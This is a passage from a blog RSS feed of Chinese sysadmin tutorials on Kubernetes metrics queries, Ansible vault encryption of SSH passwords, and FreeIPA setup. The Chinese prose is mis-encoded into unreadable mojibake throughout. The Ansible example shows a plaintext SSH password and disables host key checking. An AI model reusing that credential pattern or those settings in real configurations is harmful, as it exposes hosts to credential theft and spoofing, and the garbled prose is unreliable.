&lt;p&gt;å†çœ‹çœ‹ api çš„æ ¸å¿ƒæŒ‡æ ‡èƒ½æ‹¿åˆ°ä»€ä¹ˆï¼Œå…ˆçœ‹ Node çš„æŒ‡æ ‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl get --raw &lt;span class=&#34;s2&#34;&gt;&amp;#34;/apis/metrics.k8s.io&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl get --raw &lt;span class=&#34;s2&#34;&gt;&amp;#34;/apis/metrics.k8s.io/v1beta1&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl get --raw &lt;span class=&#34;s2&#34;&gt;&amp;#34;/apis/metrics.k8s.io/v1beta1/nodes&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq . 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20211125092534308&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211125-kubernetes_hpa/image-20211125092534308.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°é˜¿é‡Œ eci è™šæ‹ŸèŠ‚ç‚¹çš„ cpu å’Œ memory èµ„æºã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ansible vaultåŠ å¯†çš„ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20211124-ansible_vault/</link>
      <pubDate>Wed, 24 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211124-ansible_vault/</guid>
      <description>&lt;p&gt;å…¬å¸å·²ç»ç”± saltstack å…¨é¢è½¬å‘äº† ansible ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨ ansible-playbook æ‰§è¡Œå„ç§ä»»åŠ¡çš„æ—¶å€™ï¼Œéœ€è¦ç™»å½•ä¸»æœºï¼Œå°±å¿…ç„¶æ¶‰åŠåˆ°ä¸»æœº ssh å¯†ç çš„è¾“å…¥ã€‚&lt;/p&gt;
&lt;p&gt;æœ€æ—©æˆ‘ä»¬æ˜¯åœ¨ inventory é‡Œåšäº†å®šä¹‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[deqin:vars]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ansible_ssh_common_args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;host_key_checking&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ansible_ssh_user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;peadmin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ansible_ssh_pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Fuck2021!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[deqin]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;192.168.1.19&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¤ªç›´ç™½äº†ï¼Œæ‰€æœ‰çœ‹åˆ°è¿™æ–‡ä»¶å†…å®¹çš„äººéƒ½ä¼šçŸ¥é“å¯†ç äº†ã€‚å®Œå…¨æ²¡æœ‰å®‰å…¨æ€§ï¼Œè¿™æ ·è¡Œä¸é€šå•Šï¼&lt;/p&gt;
&lt;p&gt;å¥½åœ¨ ansible-vault æä¾›äº†ä¸€ç§æ–¹æ³•æ¥è§£å†³ï¼šé‚£å°±æ˜¯ç”Ÿæˆä¸€ä¸ªå¯†æ–‡æ”¾è¿›å»ï¼Œç„¶åè§£å¼€å®ƒå¿…é¡»å†è¾“å…¥ä¸€ä¸ªå¯†ç ã€‚è¿™æ ·çœ‹åˆ°çš„äººä¹Ÿä¸çŸ¥é“å®é™…çš„å¯†ç åˆ°åº•æ˜¯ä»€ä¹ˆ&lt;/p&gt;
&lt;p&gt;å…·ä½“çš„åšæ³•å¦‚ä¸‹ï¼Œé¦–å…ˆç”Ÿæˆ key &amp;ndash;&amp;gt; åŠ å¯†å­—ç¬¦ä¸²çš„é”®å€¼å¯¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ansible-vault encrypt_string &lt;span class=&#34;s1&#34;&gt;&amp;#39;Fuck2021!&amp;#39;&lt;/span&gt; --name &lt;span class=&#34;s1&#34;&gt;&amp;#39;ansible_ssh_pass&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¾“å…¥å¯†ç ï¼Œä¼šå¾—åˆ°ä¸‹é¢ä¸€ä¸²å­—ç¬¦&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ansible_ssh_pass: !vault |&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;$ANSIBLE_VAULT;1.1;AES256&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;37393235646234613332646366306233346330656666623862313339313861393239646261366237&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;6663343263363161643634653266343466356634656539650a393834663938636165336431656433&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;66333761643538623434363334316661653035313166333137373562363436613636366162353239&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;3661623733323933350a373164626131646235616361356638653733646534616163393362373135&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;na&#34;&gt;6139&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªå°±æ˜¯å¯†æ–‡äº†ï¼Œå¿…é¡»ç”¨è¾“å…¥çš„å¯†ç æ‰èƒ½è§£å¼€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ³¨æ„&lt;/strong&gt;ï¼šè¿™é‡Œçš„é”®å€¼ name ä¸å¯æ”¹å˜ï¼Œå¦‚æœä½ æƒ³æŠŠå­—ç¬¦ä¸²æ‹·è´ä¸‹æ¥ï¼Œæ”¹æ‰ ansible_ssh_pass çš„åå­—ï¼Œæ”¹æˆåˆ«çš„ï¼Œæƒ³æ”¹åå¼•ç”¨ï¼Œæ˜¯ä¸è¡Œçš„ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸€å¤§é•¿ä¸²å¯†æ–‡æœ‰ä»¥ä¸‹ä¸¤ç§ç”¨æ³•ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€iniæ ¼å¼çš„inventoryå¼•ç”¨&#34;&gt;ä¸€ã€iniæ ¼å¼çš„inventoryå¼•ç”¨&lt;/h2&gt;
&lt;p&gt;æœ€åŸå§‹çš„ inventory.ini å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[deqin:vars]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ansible_ssh_common_args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;host_key_checking&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ansible_ssh_user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;peadmin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[deqin]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;192.168.1.19&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å®šä¹‰ playbook æ–‡ä»¶ shenji.ymlï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &lt;span class=&#34;nt&#34;&gt;hosts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;deqin&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;become&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;yes&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;vars_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;pass.yml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ansible_ssh_pass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{{ ansible_ssh_pass }}&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tasks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;mkdirs&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;path=&amp;#34;{{ item }}&amp;#34; state=directory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;with_items&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;s2&#34;&gt;&amp;#34;OS.05&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;s2&#34;&gt;&amp;#34;OS.06&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŠŠå¯†æ–‡æ”¾è¿› pass.yml æ–‡ä»¶&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä½¿ç”¨FreeIPAå’ŒFreeRadiusæ­å»ºåŒå› å­è®¤è¯æœåŠ¡å™¨</title>
      <link>https://rendoumi.com/posts/20211123-freeipa_freeradius/</link>
      <pubDate>Tue, 23 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211123-freeipa_freeradius/</guid>
      <description>&lt;p&gt;å®¡è®¡å•Šå®¡è®¡ï¼Œå…¬å¸ä½¿ç”¨çš„åä¸ºé˜²ç«å¢™éœ€è¦é…ç½®åŒå› å­ç™»å½•è®¤è¯ï¼Œè¿™ä¸‹éº»çƒ¦äº†ã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥äº†ä¸€ä¸‹åä¸ºæ‰‹å†Œï¼Œæ”¯æŒ Radius è®¤è¯ï¼Œé‚£ä¹ˆæ²¡åŠæ³•ï¼Œæœ€çœé’±çš„åŠæ³•å°±æ˜¯ç”¨ FreeIPA å’Œ FreeRadius æ­ä¸€å¥— OTP åŒå› å­è®¤è¯äº†ã€‚&lt;/p&gt;
&lt;p&gt;ç³»ç»Ÿæ˜¯ CentOS 7 ï¼Œå·²å…³é—­é˜²ç«å¢™æœåŠ¡ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€æ­å»ºfreeipa&#34;&gt;ä¸€ã€æ­å»ºFreeIPA&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆè®¾ç½® hostname&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostnamectl set-hostname freeipa.rendoumi.local
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.5 freeipa.rendoumi.local&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå®‰è£… FreeIPAï¼Œæ³¨æ„è¦å›ç­”çš„å‡ ä¸ªé—®é¢˜&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸è£…bindï¼Œæ— è®ºæ˜¯ dnsmasq æˆ– corednsï¼Œéƒ½æ¯” bind è½»ï¼Œè¦è£…ä¹Ÿè£…é‚£ä¸¤ä¸ªã€‚&lt;/li&gt;
&lt;li&gt;server hostname æ˜¯ freeipa.rendoumi.local&lt;/li&gt;
&lt;li&gt;domian name æ˜¯ rendoumi.local&lt;/li&gt;
&lt;li&gt;realm name æ˜¯å¤§å†™çš„ RENDOUMI.LOCAL&lt;/li&gt;
&lt;li&gt;æœ‰ä¸¤ä¸ªå¯†ç ï¼Œç¬¬ä¸€ä¸ªæ˜¯ LDAP çš„å¯†ç ï¼Œç¬¬äºŒä¸ªæ˜¯ IPA çš„å¯†ç &lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install deltarpm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install freeipa-server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sysctl net.ipv6.conf.all.disable_ipv6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipa-server-install
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;This program will &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; up the IPA Server.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;This includes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  * Configure a stand-alone CA &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dogtag&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; certificate management
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  * Configure the Network Time Daemon &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ntpd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  * Create and configure an instance of Directory Server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  * Create and configure a Kerberos Key Distribution Center &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;KDC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  * Configure Apache &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;httpd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;To accept the default shown in brackets, press the Enter key.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WARNING: conflicting time&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;date synchronization service &lt;span class=&#34;s1&#34;&gt;&amp;#39;chronyd&amp;#39;&lt;/span&gt; will be disabled in favor of ntpd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Do you want to configure integrated DNS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;BIND&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;? &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;no&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:no
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server host name &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;freeipa.rendoumi.local&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please confirm the domain name &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rendoumi.local&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please provide a realm name &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RENDOUMI.LOCAL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Directory Manager password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;confirm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPA admin password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;confirm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The IPA Master Server will be configured with:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hostname:       freeipa.rendoumi.local
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IP address&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;es&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: 192.168.1.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain name:    rendoumi.local
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Realm name:     RENDOUMI.LOCAL
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Continue to configure the system with these values? &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;no&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: yes
